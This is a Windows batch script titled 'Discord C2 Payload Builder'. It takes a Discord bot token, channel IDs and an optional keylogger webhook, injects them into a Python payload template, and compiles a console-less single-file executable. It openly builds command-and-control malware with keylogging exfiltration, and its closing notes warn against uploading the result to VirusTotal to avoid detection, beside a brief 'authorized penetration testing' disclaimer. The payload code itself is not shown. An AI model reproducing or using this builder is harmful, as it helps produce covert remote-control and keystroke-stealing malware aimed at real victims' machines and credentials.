@echo off
echo ===============================================
echo Discord C2 Payload Builder for Windows
echo ===============================================
echo.

REM Check if UV is installed
uv --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: UV package manager not found!
    echo Please install UV first: https://docs.astral.sh/uv/getting-started/installation/
    pause
    exit /b 1
)

REM Check if Python is available
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Python not found!
    echo Please install Python 3.9 or higher
    pause
    exit /b 1
)

echo [+] Installing dependencies with UV...
uv sync

REM Get configuration from user
echo.
echo ===============================================
echo Configuration Setup
echo ===============================================
set /p PAYLOAD_NAME="Enter payload name (default: discord_bot): "
if "%PAYLOAD_NAME%"=="" set PAYLOAD_NAME=discord_bot

set /p GUILD_ID="Enter Discord Guild ID: "
if "%GUILD_ID%"=="" (
    echo ERROR: Guild ID is required!
    pause
    exit /b 1
)

set /p BOT_TOKEN="Enter Discord Bot Token: "
if "%BOT_TOKEN%"=="" (
    echo ERROR: Bot Token is required!
    pause
    exit /b 1
)

set /p CHANNEL_ID="Enter Discord Channel ID: "
if "%CHANNEL_ID%"=="" (
    echo ERROR: Channel ID is required!
    pause
    exit /b 1
)

set /p KEYLOGGER_WEBHOOK="Enter Keylogger Webhook URL (optional): "
if "%KEYLOGGER_WEBHOOK%"=="" set KEYLOGGER_WEBHOOK=

echo.
echo [+] Creating configured payload...

REM Create a copy of the template and replace placeholders
copy discord_payload.py %PAYLOAD_NAME%.py >nul

REM Replace configuration placeholders using PowerShell
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{GUILD_ID\}', '%GUILD_ID%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{BOT_TOKEN\}', '%BOT_TOKEN%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{CHANNEL_ID\}', '%CHANNEL_ID%' | Set-Content '%PAYLOAD_NAME%.py'"
powershell -Command "(Get-Content '%PAYLOAD_NAME%.py') -replace '\{KEYLOGGER_WEBHOOK\}', '%KEYLOGGER_WEBHOOK%' | Set-Content '%PAYLOAD_NAME%.py'"

echo [+] Building executable with PyInstaller...

REM Install PyInstaller if not already installed
uv add pyinstaller

REM Build the executable
uv run pyinstaller --onefile --noconsole --icon=img/exe_file.ico --name=%PAYLOAD_NAME% %PAYLOAD_NAME%.py

if %errorlevel% equ 0 (
    echo.
    echo ===============================================
    echo BUILD SUCCESSFUL!
    echo ===============================================
    echo Executable created: dist\%PAYLOAD_NAME%.exe
    echo.
    echo IMPORTANT SECURITY NOTES:
    echo - DO NOT upload to VirusTotal or similar services
    echo - Test in isolated environment first
    echo - Use only for authorized penetration testing
    echo ===============================================
    
    REM Clean up temporary files
    del %PAYLOAD_NAME%.py >nul 2>&1
    del %PAYLOAD_NAME%.spec >nul 2>&1
    
) else (
    echo.
    echo ===============================================
    echo BUILD FAILED!
    echo ===============================================
    echo Check the error messages above for details.
)

echo.
pause
